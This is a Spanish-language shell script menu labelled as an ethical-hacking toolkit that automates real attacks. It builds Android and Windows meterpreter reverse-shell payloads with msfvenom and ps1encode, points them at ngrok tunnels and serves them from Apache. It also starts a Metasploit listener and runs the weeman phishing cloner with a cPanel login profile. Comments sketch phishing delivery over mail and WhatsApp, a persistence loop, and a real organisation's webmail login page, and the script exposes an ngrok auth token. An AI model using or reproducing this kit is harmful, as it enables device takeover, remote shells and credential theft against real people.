#!/bin/sh
black=$(tput setaf 0)
red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
blue=$(tput setaf 4)
magenta=$(tput setaf 5)
cyan=$(tput setaf 6)
white=$(tput setaf 7)

normal=$(tput sgr0)

pause(){
  read -p "[Enter] para continuar..." Key
}

#whois -h whois.nic.ar tgn.com.ar >> 00.txt
# enscript -p- 00.txt | ps2pdf - hola.pdf 


val='0'
chek(){
	if [ -x /usr/bin/$1 ] || [ -x /usr/sbin/$1 ] || [ -x /usr/local/bin/$1 ] || [ -x /bin/$1 ]; then
          echo "El programa \"$1\" está instalado."
          val='1'
           else
          echo "No está instalado \"$1\"."
          val='0'
          
          fi
          
     
}

say(){

if [ $val == '0' ]
             then
               echo -n $caption
               echo -n $simbol
             else
               echo -n $caption | iconv -f utf-8 -t iso-8859-1|festival --tts
               echo -n $simbol
             fi     
}   


#soporte para voz comentar si no se desea esta capacidad
#chek festival

#reconocimiento  -->recoelccion de informacion - enumeracion - investigacion
#escaneo  --> identificacion de vulnerabilidades - definicion de vectores de ataque - validacion de la vulnerabilidad
#evaluacion --> pruebas con exploits - pruebas con credenciales - penetracion - escalamiento dprivilegios - post explotacion 
#analisis --> evaluacion de riesgo - reporte.
  



while true

do
clear
          printf "\t$green==========================================\n"
          printf "\t$red           CEH - Ethical Hacking\n"
          printf "\t$green==========================================\n"
          printf "\t$red[apache]$green    Arranca el server Apache2  p80 \n"
          printf "\t$red[NGROK]$green     Ngrok ssh tuneling server \n"
          printf "\t$red[msf_apk]$green   Crea un APK meterpreter y lo mueve a apache \n"
          printf "\t$red[msf_x86]$green   Crea APK meterpreter \n"
          printf "\t$red[ps1encode]$green ps1encode powershell meterpreter \n"
          printf "\t$red[weeman]$green    Clon facebook + ngrok \n"
          
          printf "\t$red[msf_ap]$green  Crea APK meterpreter \n"
          printf "\t$red[v]$greenVolver \n"
          printf "\t$green==========================================\n"
          printf "\t$red [*]-:"
          printf $normal
          read opc2
          case $opc2 in
          #https://owa.tgn.com.ar/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fowa.tgn.com.ar%2fowa%2f
          
          
          apache)
                 sudo systemctl start apache2
                 #ver servicios y puertos corriendo de modo local
                 sudo ufw status
         pause;;
        
          
                  
         ngrok)
                #./ngrok authtoken 31Epj4swsRnYRZUVv34wa_7HgwxvAhrLUjoCQ8UZhZd
                #****************************************************************************************
                 caption='Ingrese el protocolo:'
                 simbol='[*]-:'
                 say $caption $simbol
                 #****************************************************************************************
                read proto
             
                #****************************************************************************************
                 caption='Ingrese el puerto:'
                 simbol='[*]-:'
                 say $caption $simbol
                 #****************************************************************************************
                read puerto
               
               #ngrok authtoken 31Epj4swsRnYRZUVv34wa_7HgwxvAhrLUjoCQ8UZhZd
               ngrok $proto $puerto
         
         pause;; 
         
         
          
          
         weeman)
                 cd /opt/weeman
                 sudo weeman -p /home/pablo/01-bash/ceh/weeman-profile/hostinger-cpanel.profile

               
         
         pause;; 
          
         msf_apk)
         
                 
                  #****************************************************************************************
                 caption='Ingrese la url tcp ngrok :'
                 simbol='[*]-:'
                 say $caption $simbol
                 #****************************************************************************************
                 read ngrok
                 
                 #****************************************************************************************
                 caption='Ingrese el puerto:'
                 simbol='[*]-:'
                 say $caption $simbol
                 #****************************************************************************************
                 read port
                 
                 
                  #****************************************************************************************
                 caption='Ingrese el nombre del APK:'
                 simbol='[*]-:'
                 say $caption $simbol
                 #****************************************************************************************
                 read app
                 
                 carga="android/meterpreter/reverse_tcp"
                 
                 #echo msfvenom LHOST=$ngrok LPORT=$port -p $carga R > $app.apk
                 #echo LHOST=$ngrok LPORT=$port -p $carga R  $app.apk
                 
                 msfvenom LHOST=$ngrok LPORT=$port -p $carga R > $app.apk
                 zipalign -v 4 $app.apk $app-1.apk
                 sudo cp $app-1.apk /var/www/html
                 ls /var/www/html/*.apk
                 
                 
         pause;; 
          
         msf)
               
               carga="android/meterpreter/reverse_tcp"
               
                 #****************************************************************************************
                 caption='Ingrese el puerto:'
                 simbol='[*]-:'
                 say $caption $simbol
                 #****************************************************************************************
                 read port
                 
               echo use exploit/multi/handler > meterpreter.rc
               echo set PAYLOAD $carga >> meterpreter.rc
               echo set LHOST localhost   >> meterpreter.rc
               echo set LPORT $port >> meterpreter.rc
               #echo set ExitOnSession false >> meterpreter.rc
               #echo exploit -j -z >> meterpreter.rc
               echo run >> meterpreter.rc
               sudo msfconsole -r meterpreter.rc
         
         pause;;
    
    #ngrok
    #apk
    #infectar - pishing - mail wassap
    #msf
    #upload /home/pablo/mi.sh /sdcard
    #shell
    #sh /sdcard/mi.sh
         
                  
    #      #!/bin/bash
#while true
#do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
#sleep 20
#done
          
          
          msf_x64)
                   #msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
                   #generar el malware en formato *.ps1 windows/mwterpreter/reverse_https 
                   #Get-Content time.ps1 | powershell -noprofile -
                 
          
          
          pause;;
          
          
          
          
          
          ps1encode)
                   
                   ps1encode --LPORT=443 --LHOST=https://d605393b.ngrok.io --PAYLOAD=windows/meterpreter/reverse_https > back2.ps1
                   sudo cp back2.ps1 /var/www/html
                   ls /var/www/html
                   
         pause;;
          
          
          aslr)
          
          printf "\nProteccion randomize_va_space A:activar D:desactivar _>"
          read val
          
          if [ $val == "D" ] || [ $val == "d" ]
          then
          printf "Desactivar ASLR.."
          echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
          #printf "Listo pulsar enter :) \n"
          fi
          
          if [ $val == "A" ] || [ $val == "a" ]
          then
          printf "Activar ASLR.."
          echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
          #printf "Listo pulsar enter :) \n"
          fi
          pause;;
   
     syscall)
          #syscall segun el cpu x86_32 | x86_64 | arm
          cpu=$(gcc -dumpmachine)
          
          printf "\nIngrese el nombre de la funcion ej exit/write _>"
          read nom_f
          
          if [ $cpu == "x86_64-linux-gnu" ] 
          then
          printf "Syscall $cpu _>\n"
          cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep $nom_f
          fi
          
          if [ $cpu == "x86_32-linux-gnu" ]
          then
          printf "Syscall $cpu _>\n"
          cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep $nom_f
          fi
          
          if [ $cpu == "arm-linux-gnueabihf" ]
          then
          printf "Syscall $cpu _>\n"
          cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep $nom_f
          fi
          
          if [ $cpu == "arm-linux-gnueabi" ]
          then
          printf "Syscall $cpu _>\n"
          cat /usr/include/arm-linux-gnueabi/asm/unistd.h | grep $nom_f
          fi
          
          pause;;
          
              shell)
           cpu=$(gcc -dumpmachine)
           if [ $cpu == "x86_64-linux-gnu" ] 
          then
          for i in $(objdump -d /$path$nom_f'_x86' | grep '^ ' | sed 's/ //g' | awk -F"[\t]" {'print $2'});
            do echo -n ${i:14:2}${i:12:2}${i:10:2}${i:8:2}${i:6:2}${i:4:2}${i:2:2}${i:0:2};done|sed 's/.\{2\}/\\x&/g'   
            printf "Listo pulsar enter :) \n"
          fi
          
          if [ $cpu == "arm-linux-gnueabi" ]
          then
          for i in $(objdump -d /$path$nom_f'_arm' | grep '^ ' | sed 's/ //g' | awk -F"[\t]" {'print $2'});
            do echo -n ${i:6:2}${i:4:2}${i:2:2}${i:0:2};done|sed 's/.\{2\}/\\x&/g'   
            printf "Listo pulsar enter :) \n"
          fi
     
          pause;;   
  
     cpuinfo)
           printf 'Informacion del procesador es:-->'
           cat /proc/cpuinfo
           pause;;
                 v)
          return 0;;
     *)
          printf "Seleciona una opcion valida :)";
          pause;;          
  esac
        
done
